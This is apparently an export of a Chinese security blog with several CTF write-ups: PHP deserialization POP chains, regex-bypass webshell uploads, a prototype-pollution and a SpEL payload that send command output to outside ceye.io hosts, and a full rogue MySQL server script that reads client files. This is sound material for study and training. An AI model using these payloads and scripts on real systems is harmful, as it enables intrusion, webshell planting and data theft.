option是在模板引擎中渲染的值。这里读的是sourceURL属性的值，我们可以通过添加一个sourceURL属性，修改它的值，通过js原型链污染在function中达到执行js的目的，模板：1new Function(\"\",\"//# sourceURL='xxx'\\r\\n CODE \\r\\n\")(); 但是这里我们要注意一点因为require不是全局的，他只存在于当前的模块范围，但是new function是在新的领域运行的，所以我们想利用的话要先将它引用过来最后攻击链 1&#123;\"__proto__\":&#123;\"sourceURL\":\"xxx\\r\\nvar require = global.require || global.process.mainModule.constructor._load;var result = require('child_process').execSync('cat /flag_thepr0t0js').toString();var req = require('http').request(`http://onsdtb.ceye.io/$&#123;result&#125;`);req.end();\\r\\n\"&#125;&#125;","comments":true,"permalink":"https://xi4or0uji.github.io/2019/03/25/code-breaking-thejs/","categories":[{"name":"WEB","slug":"WEB","permalink":"https://xi4or0uji.github.io/categories/WEB/"}],"tags":[{"name":"Code Breaking","slug":"Code-Breaking","permalink":"https://xi4or0uji.github.io/tags/Code-Breaking/"}]},{"title":"code breaking lumenserial","date":"2019-03-24T16:00:00.000Z","path":"2019/03/25/code-breaking-lumenserial/","text":"小菜鸡太菜了，只能复现 题目先审计源码，可以看到EditorController.php有个download函数12345678910111213private function download($url)&#123; $maxSize = $this-&gt;config['catcherMaxSize']; $limitExtension = array_map(function ($ext) &#123; return ltrim($ext, '.'); &#125;, $this-&gt;config['catcherAllowFiles']); $allowTypes = array_map(function ($ext) &#123; return \"image/&#123;$ext&#125;\"; &#125;, $limitExtension); $content = file_get_contents($url); $img = getimagesizefromstring($content); ......&#125; 可以看到这个函数里面有个file_get_contents函数，通过get方法传进去一个url，而且这个参数完全可控，因此我们可以利用它进行phar反序列化操作，而且文件上传的点还很容易找到，能直接上传图片。但是有个注意的是，php的版本是7.2，8能动态调用assert函数，还禁用了很多系统函数system,shell_exec,passthru,exec,popen,proc_open,pcntl_exec,mail,apache_setenv,mb_send_mail,dl,set_time_limit,ignore_user_abort,symlink,link,error_log，因此反序列化难度+++ 分析找pop链PendingBroadcast先看illuminate/boradcasting/PendingBroadcast.php这个文件123public function __destruct()&#123; $this-&gt;events-&gt;dispatch($this-&gt;event);&#125; 可以通过这个方法将一些类的__call方法调用出来 ValidGenerator在faker/src/Facker/ValidGenerator.php里面有个__call方法，这个方法里面调用了两个动态调用函数1234567891011public function __call($name, $arguments)&#123; $i = 0; do &#123; $res = call_user_func_array(array($this-&gt;generator, $name), $arguments); $i++; if ($i &gt; $this-&gt;maxRetries) &#123; throw new \\OverflowException(sprintf('Maximum retries of %d reached without finding a valid value', $this-&gt;maxRetries)); &#125; &#125; while (!call_user_func($this-&gt;validator, $res)); return $res;&#125; 这个类里面传进去的name参数是不可控的，因此我们第一次调用$res = call_user_func_array(array($this-&gt;generator, $name)并不能如我们所愿实现任意命令，但是我们可以找到一个类，使上面调用的出来的结果可控，从而在第二次调用call_user_func($this-&gt;validator, $res)的时候实现控制。而且，name的值就是dispatch，由于在call_user_func_array里面，generator类中没有定义dispatch函数，因此会自动调用__call函数 Generatorfzaninotto/faker/src/Faker/Generator.php先看__call函数123public function __call($method, $attributes)&#123; return $this-&gt;format($method, $attributes);&#125; 跟进去format函数123public function format($formatter, $arguments = array())&#123; return call_user_func_array($this-&gt;getFormatter($formatter), $arguments);&#125; formatter参数8可控，继续跟12345public function getFormatter($formatter)&#123; if (isset($this-&gt;formatters[$formatter])) &#123; return $this-&gt;formatters[$formatter]; &#125; ... 好了，这里我们能看到他的return值是一个数组的值，因此，我们先让第一次$this-&gt;getFormatter($formatter)返回的值是一个数组，数组值为getFormatter，然后由于call_user_func_array，他会再调用一次getFormatter方法，参数为空，而这个方法传空值时，就会返回第一个formatters成员的值 StaticInvocation接下来最后一步就是要找一个比较好的类了phpunit\\src\\Framework\\MockObject\\Stub\\ReturnCallback.php里面看invoke函数123public function invoke(Invocation $invocation)&#123; return \\call_user_func_array($this-&gt;callback, $invocation-&gt;getParameters());&#125; invoke方法调用了call_user_func_array而且里面的两个参数都是反序列化的时候可以控制的，Invocation只是一个接口，找到那个类就能利用了找下类的方法123456class StaticInvocation implements Invocation, SelfDescribing&#123; public function getMethodName(): string&#123; return $this-&gt;methodName; &#125; &#125; 利用这个返回回到ValidGenreator中利用call_user_func就能成功完成攻击了 exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768&lt;?php/** * Created by PhpStorm. * User: Ariel * Date: 2019/4/8 * Time: 20:42 */namespace Illuminate\\Broadcasting&#123; class PendingBroadcast&#123; function __construct()&#123; $this-&gt;events = new \\Faker\\ValidGenerator(); $this-&gt;event = 'Ariel'; &#125; &#125;&#125;namespace PHPUnit\\Framework\\MockObject\\Invocation&#123; class StaticInvocation&#123; function __construct()&#123; $this-&gt;parameters = array('/var/www/html/upload/a.php','&lt;?php phpinfo();eval($_POST[\"a\"]);?&gt;'); &#125; &#125;&#125;namespace PHPUnit\\Framework\\MockObject\\Stub&#123; class ReturnCallback&#123; function __construct()&#123; $this-&gt;callback = 'file_put_contents'; &#125; &#125;&#125;namespace Faker&#123; class ValidGenerator&#123; function __construct()&#123; $si = new \\PHPUnit\\Framework\\MockObject\\Invocation\\StaticInvocation(); $g1 = new \\Faker\\Generator(array('Ariel' =&gt; $si )); $g2 = new \\Faker\\Generator(array(\"dispatch\" =&gt; array($g1, \"getFormatter\"))); $rc = new \\PHPUnit\\Framework\\MockObject\\Stub\\ReturnCallback(); $this-&gt;validator = array($rc, \"invoke\"); $this-&gt;generator = $g2; $this-&gt;maxRetries = 10000; &#125; &#125; class Generator&#123; function __construct($form)&#123; $this-&gt;formatters = $form; &#125; &#125;&#125;namespace&#123; $exp = new Illuminate\\Broadcasting\\PendingBroadcast(); echo (urlencode(serialize($exp))); // phar $p = new Phar('./a.phar', 0); $p-&gt;startBuffering(); $p-&gt;setStub('GIF89a&lt;?php __HALT_COMPILER(); ?&gt;'); $p-&gt;setMetadata($exp); $p-&gt;addFromString('1.txt','text'); $p-&gt;stopBuffering();&#125; 上传图片然后访问http://xiaorouji.cn:8080/server/editor?action=Catchimage&amp;source[]=phar:///var/www/html/upload/image/843ac0c4952e20f0d95d1651b86d6792/201904/10/00c7ab10a3e36d18dd9d.gif去触发反序列化接着访问http://xiaorouji.cn:8080/upload/a.php，成功getshell参考kk师傅的博客","comments":true,"permalink":"https://xi4or0uji.github.io/2019/03/25/code-breaking-lumenserial/","categories":[{"name":"WEB","slug":"WEB","permalink":"https://xi4or0uji.github.io/categories/WEB/"}],"tags":[{"name":"Code Breaking","slug":"Code-Breaking","permalink":"https://xi4or0uji.github.io/tags/Code-Breaking/"}]},{"title":"code breaking easy","date":"2019-03-19T16:00:00.000Z","path":"2019/03/20/code-breaking-easy/","text":"前言这个是知识星球里面的一个比赛，一开始的时候事情多，没及时做，最近刷ph牛的文章看到这个比赛，找来复现一下 function题目function这题是一个php代码审计题，题目很短123456789&lt;?php$action = $_GET['action'] ?? '';$arg = $_GET['arg'] ?? '';if(preg_match('/^[a-z0-9_]*$/isD', $action)) &#123; show_source(__FILE__);&#125; else &#123; $action('', $arg);&#125; 可以看到，题目想要我们输入两个参数绕过正则，然后就可以执行任意命令了 题解寻找可利用字符我们先审计源码，可以看到如果传过来action和arg那就分别赋值，然后对action进行正则表达式过滤先看正则表达式1234/^[a-z0-9_]*$/isD/i 忽略大小写/s 匹配任何不可见字符/D 如果正则表达式用$限制结尾字符，则不允许结尾有换行 所以我们现在就要找一个开头不是字母数字和下划线的值，同时还要可以正常地执行函数因此我们先fuzz一下1234567891011import requestsfor i in range(0,256): s= hex(i)[2:] if len(s)&lt;2: s = '%0'+s else: s = '%'+s url = 'http://xiaorouji.cn:8087/?action='+s+'var_dump&amp;arg=find' r = requests.get(url=url).content if 'find' in r: print s 跑出来%5c可以成功绕过，原因p神在小密圈说了12php里默认命名空间是\\，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\\function_name() 这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。 寻找getshell函数接下来的利用我们就要用到create_function函数了在官方手册中它是这样的1create_function ( string $args , string $code ) : string 这个函数由两个参数组成，第一个是函数名，第二个是函数内的代码。官方例子如下12345$newfunc = create_function('$a,$b', 'return \"ln($a) + ln($b) = \" . log($a * $b);');实际上也就是 function test($a,$b)&#123; return \"ln($a) + ln($b) = \".log($a*$b);&#125; 也可以简单理解成123create_function($_GET['args'],$_GET['code']);$a = 'function __lambda_func('.$_GET['args'].')&#123;'.$_GET['code'].'&#125;\\0';eval($a); 顺便看一下create_function的源码也可以看到第一个参数是用(闭合的，第二个是用{闭合的 getflag剩下的就是闭合以及利用了,尝试一下能不能得到phpinfo接下来就是getshell了，尝试下利用system函数发现被禁了，那就试下scandir函数成功getflag（这个flag是在上一层的目录上 parewaf这个题目依旧很短，考的是php的正则特性 题目1234567891011121314151617 &lt;?phpfunction is_php($data)&#123; return preg_match('/&lt;\\?.*[(`;?&gt;].*/is', $data);&#125;if(empty($_FILES)) &#123; die(show_source(__FILE__));&#125;$user_dir = 'data/' . md5($_SERVER['REMOTE_ADDR']);$data = file_get_contents($_FILES['file']['tmp_name']);if (is_php($data)) &#123; echo \"bad request\";&#125; else &#123; @mkdir($user_dir, 0755); $path = $user_dir . '/' . random_int(0, 10) . '.php'; move_uploaded_file($_FILES['file']['tmp_name'], $path); header(\"Location: $path\", true, 303);&#125; 可以看到，这是一个上传文件的代码首先拿到了文件会先判断是不是里面有没有php代码，如果有就返回bad request，否则就新建一个路径为data/md5($_SERVER[&#39;REMOTE_ADDR&#39;])，然后将文件命名为randon_int(0,10).php存储在新建的文件夹里面，最后将存储路径在http头里面返回过来 题解分析正则首先我们先看一下他的正则表达式1/&lt;\\?.*[(`;?&gt;].*/is 的匹配过程可以看到它先是从前面匹配了&lt;?，接下来的.*将所有都匹配了，然后还需要匹配就要回溯回去前面，因此一直回溯到前面的&gt;完成符号匹配，然后从该点开始向后进行匹配，完成最后的.*匹配而同时，php为了防止正则表达式的拒绝服务攻击，设置了一个回溯次数的上限而如果回溯次数超过1000000的时候，它的返回就变成了false了 payload既然已经知道要怎么绕过漏洞点了，接下来就是写payload了123456789import requestsfrom io import BytesIOfile = &#123; 'file': BytesIO('&lt;?php eval($_POST[\"cmd\"]);//' + 'a'*1000010)&#125;res = requests.post('http://xiaorouji.cn:8088/',files=file,allow_redirects=False)print res.headers['Location'] 拿到了shell文件目录以后就是利用了getflag√ phpmagic这个题目让人感觉略为懵逼，但是找到源码就做起来舒服了 题目源码如下123456789101112131415161718192021if(isset($_GET['read-source'])) &#123; exit(show_source(__FILE__));&#125;define('DATA_DIR', dirname(__FILE__) . '/data/' . md5($_SERVER['REMOTE_ADDR']));if(!is_dir(DATA_DIR)) &#123; mkdir(DATA_DIR, 0755, true);&#125;chdir(DATA_DIR);$domain = isset($_POST['domain']) ? $_POST['domain'] : '';$log_name = isset($_POST['log']) ? $_POST['log'] : date('-Y-m-d');if(!empty($_POST) &amp;&amp; $domain): $command = sprintf(\"dig -t A -q %s\", escapeshellarg($domain)); $output = shell_exec($command); $output = htmlspecialchars($output, ENT_HTML401 | ENT_QUOTES); $log_name = $_SERVER['SERVER_NAME'] . $log_name; if(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), ['php', 'php3', 'php4', 'php5', 'phtml', 'pht'], true)) &#123; file_put_contents($log_name, $output); &#125; echo $output;endif; 题解审计源码可以看到，文件名和文件内容我们都是可以知道的，但是文件内容会经过htmlspecialchars，所以想直接传个小马是8可能的，但是php有一个特性，只要能进行文件传输的地方，基本是都是能进行协议流的传输的，我们先本地尝试一波果然可以写文件，那么现在问题来了，文件名前面会加上$_SERVER[&#39;SERVER_NAME&#39;]，同时后缀几乎全部过滤了，还有就是文件内容也不是完全可控的首先文件名前面加上的$_SERVER[&#39;SERVER_NAME&#39;]，我们可以通过修改Host的值达到控制的目的接下来，我们想要绕过后缀要用到一个黑魔法，所以我们只要在文件名后面加个\\.就可以绕过限制了最后是文件内容不可控，但是我们可以看到，我们传过去的是base64编码的，在php伪协议解码的时候，遇到不规范的字符是会自动跳过解码的，因此我们只需要填充前面的规范字符使前面的字符是4的倍数，就能成功的让我们想写的shell文件成功解码了先找一下前面的字符可以看到规范字符ltltgtgtDiG9959deb8u15DebianltltgtgttAq刚好40位，4的倍数，所以直接加文件内容就行啦接下来就是利用了这样就能写进webshell了 phplimit这道题目很短，满足了正则就能执行任意命令了 题目123456&lt;?phpif(';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $_GET['code'])) &#123; eval($_GET['code']);&#125; else &#123; show_source(__FILE__);&#125; 题解从正则表达式可以看到它会匹配字母和括号，接下来找一找能绕过的方法可以看到只要最内层的函数没有参数的话，正则就能绕过，这里我们利用session去达到执行命令的目的session_id，用来设置或者获取当前会话的id，对应PHPSESSID的值session_start，用来创建新的会话或者重用现有会话因此我们可以利用session_id(session_start())，但是PHPSESSID只允许字母数字和下划线，所以要将字符换下编码最后就是利用了还有一个其他师傅的payload1readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd()))))))); 巨强 nodechr一进去就是一大堆代码…… 题目首先审计源码可以看到题目将flag放进去数据库，然后让用户登录进去，先贴一波关键源码12345678910111213141516171819202122232425function safeKeyword(keyword) &#123; if(isString(keyword) &amp;&amp; !keyword.match(/(union|select|;|\\-\\-)/is)) &#123; return keyword &#125; return undefined&#125;async function login(ctx, next) &#123; if(ctx.method == 'POST') &#123; let username = safeKeyword(ctx.request.body['username']) let password = safeKeyword(ctx.request.body['password']) let jump = ctx.router.url('login') if (username &amp;&amp; password) &#123; let user = await ctx.db.get(`SELECT * FROM \"users\" WHERE \"username\" = '$&#123;username.toUpperCase()&#125;' AND \"password\" = '$&#123;password.toUpperCase()&#125;'`) if (user) &#123; ctx.session.user = user jump = ctx.router.url('admin') &#125; &#125; ctx.status = 303 ctx.redirect(jump) &#125; else &#123; await ctx.render('index') &#125;&#125; 可以看到他将union和select那些过滤了，所以想直接读flag有点难，但是我们可以看到有个toUpperCase函数，看下ph牛的这篇文章，因此我们可以利用这些字符写payload最终payload123456789#coding:utf-8import requests,base64url = \"http://xiaorouji.cn:8085/login\"data = &#123; \"username\": \"admin\", \"password\": \"0' unıon ſelect 1,flag,3 from flags where '1'='1\"&#125;res = requests.post(url,data=data).contentprint res Javacon这题我们首先可以拿到一个jar包，然后用idea反编译出来可以看到一堆的java代码，肉鸡枯了…….先看一下目录结构，有5个类和一个配置文件配置文件里面放了用户信息，因此我们用admin/admin是可以登录进网站的接下来就去看MainController文件，这里只放重点函数可以看到登录的时候，如果选了remember-me，就会将用户加密存储在cookie里面接着admin会对跳转之后的cookie做处理，判断remember-me的值是否存在，如果存在就解密验证过程上图，可以看见是先找黑名单，如果匹配出来返回FORBIDDEN，否则就继续下面的语句，在SmallEvaluationContext中进行SPEL解析，又因为有黑名单java.+lang,Runtime,exec.*\\(，所以最后的利用字符串拼接和反射构造pop链exp如下1234567891011121314151617181920212223242526272829303132package com.company;import javax.crypto.spec.IvParameterSpec;import java.util.Base64;import javax.crypto.Cipher;import javax.crypto.spec.SecretKeySpec;import org.slf4j.LoggerFactory;class Encryptor&#123; static org.slf4j.Logger logger = LoggerFactory.getLogger(Encryptor.class); public static String encrypt(String key, String initVector, String value)&#123; try&#123; IvParameterSpec iv = new IvParameterSpec(initVector.getBytes(\"UTF-8\")); SecretKeySpec skeySpec = new SecretKeySpec(key.getBytes(\"UTF-8\"),\"AES\"); Cipher cipher = Cipher.getInstance(\"AES/CBC/PKCS5PADDING\"); cipher.init(1, skeySpec, iv); byte[] encrypted = cipher.doFinal(value.getBytes()); return Base64.getUrlEncoder().encodeToString(encrypted); &#125;catch (Exception e)&#123; logger.warn(e.getMessage()); &#125; return null; &#125;&#125;public class Main &#123; public static void main(String[] args) &#123; //查看目录 System.out.println(Encryptor.encrypt(\"c0dehack1nghere1\", \"0123456789abcdef\", \"#&#123;T(String).getClass().forName('java.la'+'ng.Ru'+'ntime').getMethod('ex'+'ec',T(String[])).invoke(T(String).getClass().forName('java.la'+'ng.Ru'+'ntime').getMethod('getRu'+'ntime').invoke(T(String).getClass().forName('java.la'+'ng.Ru'+'ntime')), new String[]&#123;'/bin/bash','-c','curl http://abcdef.ceye.io/`cd / &amp;&amp; ls|base64|tr \\\"\\n\\\" \\\"-\\\"`'&#125;)&#125;\")); //读flag文件 System.out.println(Encryptor.encrypt(\"c0dehack1nghere1\", \"0123456789abcdef\", \"#&#123;T(String).getClass().forName('java.la'+'ng.Ru'+'ntime').getMethod('ex'+'ec',T(String[])).invoke(T(String).getClass().forName('java.l'+'ang.Ru'+'ntime').getMethod('getRu'+'ntime').invoke(T(String).getClass().forName('java.l'+'ang.Ru'+'ntime')),new String[]&#123;'/bin/bash','-c','curl http://abcdef.ceye.io/`cat flag_j4v4_chun|base64`'&#125;)&#125;\")); &#125;&#125; 读目录读flag","comments":true,"permalink":"https://xi4or0uji.github.io/2019/03/20/code-breaking-easy/","categories":[{"name":"WEB","slug":"WEB","permalink":"https://xi4or0uji.github.io/categories/WEB/"}],"tags":[{"name":"Code_Breaking","slug":"Code-Breaking","permalink":"https://xi4or0uji.github.io/tags/Code-Breaking/"}]},{"title":"2019GWHT考核题wp","date":"2019-03-16T16:00:00.000Z","path":"2019/03/17/2019GWHT考核题wp/","text":"本来想着招新完讲完题就不用题解了，但是看见有些小朋友还是很懵逼，补上一篇 WEBweb签到题网址：http://xiaorouji.cn:2334/web1/这道题其实考察的是对http头的各种操作还有抓包，首先进去题目看到一堆骚话，完了以后就是问do you know GWHT browser?，很明显是要我们改访问的浏览器，接着是only accept www.gwht.com to visit this website，修改访问网站，然后you are not the localhost, prprprpr，要求本地访问，然后就是i only know Spanish......，明显是要改accept-language，出题人背锅了，这里当初谷歌的时候是es-es，结果没想到百度居然不是这个，导致一堆不匹配，坑死一堆小朋友……….最后是You have not logged in yet，改cookie就行，所以最终改出来的包是接着通过抓包可以看到它会先跳去flag2333.php然后立刻转去noflag.php所以最后我们看flag2333.php的包就能看到flag了 do u know 菜刀？网址：http://xiaorouji.cn:2333/web2/这道题进去首先看到一个假flag，但是同时还提示有个shell在这个网站里面扫一下后台看见有个shell.php访问一下试下看到有个小马，接着就是菜刀连过去了连过去以后可以看到一个flag.js将它下下来打开看看，明显是aaencode加密拿去网站解密出来是这段明显是一张图片的base64编码，将它转图片是个二维码，扫一下就出flag了 sql注入网址：http://shifeng-kaze.cn:912/先网页进去源码可以看到注入语句可以看到它是在数据库选出一个密码然后和传过来md5加密的passwd对比，如果相等就登录成功，payload如下登录成功以后就到了第二关了，还是一个sql注入的地方，要去找no和name，fuzz一下看一下过滤了什么可以看到第一个参数过滤了\\ # =，第二个参数过滤了‘`，所以我们可以利用单引号逃逸完成注入，最终payload如下，爆数据库爆表那些就不放上去了1no=-1\\&amp;name= union select val from gwhts limit 1,1 # serialize’s revenge网址：http://xiaorouji.cn:100/web4/这题在robots.txt可以看到一部分源码123456789$file = $_GET['file'];$text = $_GET['text'];if (!!$text || file_get_contents($text,'r') === \"hello ctf\")&#123; echo \"hi!\".\"&lt;br&gt;\"; include ($file); //backdoor.php&#125;else&#123; echo \"you are not my friend!\"; exit();&#125; 可以看到有一个文件包含漏洞，利用php://filter去读文件出来拿到了base64加密后的数据后解密就有源码了12345678910111213141516171819202122232425262728293031&lt;?phpclass Flag&#123; public $obj; public function __construct()&#123; $this-&gt;obj = new Safe; &#125; public function __toString()&#123; if (isset($this-&gt;obj))&#123; return $this-&gt;obj-&gt;read(); &#125;else&#123; return \"go away hacker\"; &#125; &#125;&#125;class Secret&#123; //fllllllag.php public $file; public function read()&#123; return file_get_contents($this-&gt;file); &#125;&#125;class Safe&#123; public function read()&#123; return \"it's very safe!\"; &#125;&#125;$secret = $_GET['secret'];if (isset($secret))&#123; echo unserialize($secret);&#125;else&#123; echo \"your hat is too black!\";&#125; 接着就是审计源码了，可以看到有个Flag，Secret和Safe三个类，接着也可以看到Secret类有个file_get_contents函数，可以读取任意文件，同时也提示了fllllllag.php，但是没有可以引发这个函数的方法，最后看去Flag这个类，可以知道$obj其实是一个类，里面的__toString魔幻函数可以调用$obj这个类的read函数，因此最终的pop链就是构造Flag类，设定$obj为Secret类，Secret类的$file设定为fllllllag.php，最后序列化Flag这个类，反序列化时触发漏洞，exp如下12345678910111213141516171819202122&lt;?phpclass Flag&#123; public $obj; public function __construct()&#123; $this-&gt;obj = new Secret; &#125; public function __toString()&#123; if (isset($this-&gt;obj))&#123; return $this-&gt;obj-&gt;read(); &#125;else&#123; return \"go away hacker\"; &#125; &#125;&#125;class Secret&#123; //fllllllag.php public $file = \"fllllllag.php\" ; public function read()&#123; return file_get_contents($this-&gt;file); &#125;&#125;$flag = new Flag();echo serialize($flag); 最后回到index.php去触发反序列化漏洞","comments":true,"permalink":"https://xi4or0uji.github.io/2019/03/17/2019GWHT考核题wp/","categories":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"利用mysql local infile读取客户端文件","date":"2019-03-14T16:00:00.000Z","path":"2019/03/15/利用mysql-local-infile读取客户端文件/","text":"这个利用点是之前补hgame的题看到的一个考点，记录一下 MySQL LOAD DATA INFILE简介先看一张官方文档的图可以看到，握手阶段中会：1234客户端和用户端交换各自功能根据需要创建SSL通道接收客户端的回应验证客户端身份进行通信 我们在linux里面tcpdump一下抓取数据包tcpdump -i lo -w mysql.pcap port 3306，然后连接mysql看下数据包可以看到登录的数据包里面有个Can Use LOAD DATA LOCAL开启了，只要开启了这个，就可以将运行mysql客户端的主机的文件传输到远程服务器中而load data infile这个命令里主要是将读到的文件的内容放进表中12load data infile &apos;/etc/passwd&apos; into table test;load data local infile &apos;/etc/passwd&apos; into table test; 两个语句的差别就是第二个读取的是客户端的文件并放入表中，那么问题来了，如果我们可以弄个恶意的mysql服务器，那么是不是就可以将连接到这个服务器的客户端的敏感文件都读出来想要伪造mysql服务端，首先我们先要了解他们之间的通信是怎样的 mysql通信步骤继续是在linux里面抓包，把流量包拿下来分析可以看到，首先是greeting包，这是第一个步骤接下来是login包然后就是一些初始化查询接下来就是用户的查询，这里我查询的是load data local infile这个语句，请求访问客户端的/etc/passwd文件然后服务端又返回了一个/etc/passwd的流量包这个时候客户端发回来的就是/etc/passwd文件的内容了好了，到了这里我们大概有点思路了，如果我们改了服务端返回的数据包，要求请求其他文件，客户端是不是会继续发过来呢，幸运的是，确实是这样的客户端并没有记住自己上次请求的文件究竟是什么，他只是根据服务端要求传输文件，简单来说就是可以看到，无论服务端说什么，客户端都是会执行的，好的，现在还有一个问题，就是我不一定每次都能等到客户端向我发出文件请求，看回上面的安全文档，可以看到后面还有一句，就是服务端可以在任何语句后面回复一句文件传输要求，同时我们还记得，在mysql连接的时候，客户端是会先来一句初始化的查询去探测指纹信息的，因此，我们可以直接利用了 恶意mysql服务端伪造现在我们需要做的就是制作恶意的服务端，完成下面几个步骤：123向mysql client发送server greeting等待client发送一个query 然后回复一个file tranfer请求 这样我们就可以看到拿到任意的文件了exp如下（改动github上面的脚本）123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232#!/usr/bin/env python#coding: utf8import socketimport asyncoreimport asynchatimport structimport randomimport loggingimport logging.handlersPORT = 3306log = logging.getLogger(__name__)log.setLevel(logging.DEBUG)tmp_format = logging.handlers.WatchedFileHandler('mysql.log', 'ab')tmp_format.setFormatter(logging.Formatter(\"%(asctime)s:%(levelname)s:%(message)s\"))log.addHandler( tmp_format)filelist = ( '/etc/passwd')#================================================#=======No need to change after this lines=======#================================================__author__ = 'Gifts'def daemonize(): import os, warnings if os.name != 'posix': warnings.warn('Cant create daemon on non-posix system') return if os.fork(): os._exit(0) os.setsid() if os.fork(): os._exit(0) os.umask(0o022) null=os.open('/dev/null', os.O_RDWR) for i in xrange(3): try: os.dup2(null, i) except OSError as e: if e.errno != 9: raise os.close(null)class LastPacket(Exception): passclass OutOfOrder(Exception): passclass mysql_packet(object): packet_header = struct.Struct('&lt;Hbb') packet_header_long = struct.Struct('&lt;Hbbb') def __init__(self, packet_type, payload): if isinstance(packet_type, mysql_packet): self.packet_num = packet_type.packet_num + 1 else: self.packet_num = packet_type self.payload = payload def __str__(self): payload_len = len(self.payload) if payload_len &lt; 65536: header = mysql_packet.packet_header.pack(payload_len, 0, self.packet_num) else: header = mysql_packet.packet_header.pack(payload_len &amp; 0xFFFF, payload_len &gt;&gt; 16, 0, self.packet_num) result = \"&#123;0&#125;&#123;1&#125;\".format( header, self.payload ) return result def __repr__(self): return repr(str(self)) @staticmethod def parse(raw_data): packet_num = ord(raw_data[0]) payload = raw_data[1:] return mysql_packet(packet_num, payload)class http_request_handler(asynchat.async_chat): def __init__(self, addr): asynchat.async_chat.__init__(self, sock=addr[0]) self.addr = addr[1] self.ibuffer = [] self.set_terminator(3) self.state = 'LEN' self.sub_state = 'Auth' self.logined = False self.push( mysql_packet( 0, \"\".join(( '\\x0a', # Protocol '5.7.23-0ubuntu0.16.04.1' + '\\00', # Version #'5.1.66-0+squeeze1' + '\\0', '\\x31\\x00\\x00\\x00', # Thread ID '\\x0b\\x05\\x32\\x62\\x1a\\x6b\\x4e\\x3c' + '\\00', # Salt '\\xff\\xf7', # Capabilities '\\x08', # Collation '\\x02\\x00\\xff\\x81\\x15', # Server Status '\\00' * 10, # Unknown '\\x75\\x41\\x1f\\x0e\\x5d\\x22\\x3e\\x05\\x21\\x56\\x14\\x5d' + '\\00', \"mysql_native_password\" + '\\x00' )) ) ) self.order = 1 self.states = ['LOGIN', 'CAPS', 'ANY'] def push(self, data): log.debug('Pushed: %r', data) data = str(data) asynchat.async_chat.push(self, data) def collect_incoming_data(self, data): log.debug('Data recved: %r', data) self.ibuffer.append(data) def found_terminator(self): data = \"\".join(self.ibuffer) self.ibuffer = [] if self.state == 'LEN': len_bytes = ord(data[0]) + 256*ord(data[1]) + 65536*ord(data[2]) + 1 if len_bytes &lt; 65536: self.set_terminator(len_bytes) self.state = 'Data' else: self.state = 'MoreLength' elif self.state == 'MoreLength': if data[0] != '\\0': self.push(None) self.close_when_done() else: self.state = 'Data' elif self.state == 'Data': packet = mysql_packet.parse(data) try: if self.order != packet.packet_num: raise OutOfOrder() else: # Fix ? self.order = packet.packet_num + 2 if packet.packet_num == 0: if packet.payload[0] == '\\x03': log.info('Query') filename = random.choice(filelist) PACKET = mysql_packet( packet, '\\xFB&#123;0&#125;'.format(filename) ) self.set_terminator(3) self.state = 'LEN' self.sub_state = 'File' self.push(PACKET) elif packet.payload[0] == '\\x1b': log.info('SelectDB') self.push(mysql_packet( packet, '\\xfe\\x00\\x00\\x02\\x00' )) raise LastPacket() elif packet.payload[0] in '\\x02': self.push(mysql_packet( packet, '\\0\\0\\0\\x02\\0\\0\\0' )) raise LastPacket() elif packet.payload == '\\x00\\x01': self.push(None) self.close_when_done() else: raise ValueError() else: if self.sub_state == 'File': log.info('-- result') log.info('Result: %r', data) if len(data) == 1: self.push( mysql_packet(packet, '\\0\\0\\0\\x02\\0\\0\\0') ) raise LastPacket() else: self.set_terminator(3) self.state = 'LEN' self.order = packet.packet_num + 1 elif self.sub_state == 'Auth': self.push(mysql_packet( packet, '\\0\\0\\0\\x02\\0\\0\\0' )) raise LastPacket() else: log.info('-- else') raise ValueError('Unknown packet') except LastPacket: log.info('Last packet') self.state = 'LEN' self.sub_state = None self.order = 0 self.set_terminator(3) except OutOfOrder: log.warning('Out of order') self.push(None) self.close_when_done() else: log.error('Unknown state') self.push('None') self.close_when_done()class mysql_listener(asyncore.dispatcher): def __init__(self, sock=None): asyncore.dispatcher.__init__(self, sock) if not sock: self.create_socket(socket.AF_INET, socket.SOCK_STREAM) self.set_reuse_addr() try: self.bind(('', PORT)) except socket.error: exit() self.listen(5) def handle_accept(self): pair = self.accept() if pair is not None: log.info('Conn from: %r', pair[1]) tmp = http_request_handler(pair)z = mysql_listener()daemonize()asyncore.loop() 这里有个坑点就是连接要以127.0.0.1去连接mysql，因为localhost是以socket连接的到了这里我们就可以伪造mysql读取客户端任意文件了","comments":true,"permalink":"https://xi4or0uji.github.io/2019/03/15/利用mysql-local-infile读取客户端文件/","categories":[{"name":"WEB","slug":"WEB","permalink":"https://xi4or0uji.github.io/categories/WEB/"}],"tags":[{"name":"mysql","slug":"mysql","permalink":"https://xi4or0uji.github.io/tags/mysql/"}]},{"title":"2019 hgame week4","date":"2019-03-10T16:00:00.000Z","path":"2019/03/11/2019-hgame-week4/","text":"happy python这题就是很普遍的session伪造，首先在url后面加49发现确实可以执行，但是测试一下发现过滤了括号，所以想直接ssti是很难的了解密一下session猜测是不是将user_id改成1就能以admin的身份登进去，现在就要想办法拿到secret_key了尝试了一下，发现url_for还在，就用url_for去拿secret_key，payload如下1url_for.__globals__['current_app'].config 然后得到回显1&lt;Config &#123;'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': '9RxdzNwq7!nOoK3*', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 